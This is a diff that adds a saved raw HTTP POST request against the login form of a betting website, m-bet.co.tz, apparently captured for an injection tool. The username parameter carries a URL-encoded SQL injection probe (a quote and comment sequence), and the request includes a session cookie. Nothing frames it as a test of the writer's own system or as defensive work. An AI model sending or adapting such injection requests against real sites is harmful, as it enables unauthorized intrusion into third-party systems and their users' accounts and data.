@@ -1,0 +1,23 @@
+POST / HTTP/1.1
+Host: m-bet.co.tz
+Cookie: popUpPromo=true; __zlcmid=1K6mStYetiv7Jcc; PHPSESSID=p9u06vg1f508cg1s9og77b37s4
+Content-Length: 113
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://m-bet.co.tz
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://m-bet.co.tz/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,vi;q=0.8
+Connection: close
+
+LoginForm%5Busername%5D=%27--+-757+gh%C4%91fv&MUserLoginForm%5BrememberMe%5D=&LoginForm%5Bpassword%5D=h&yt2=Login
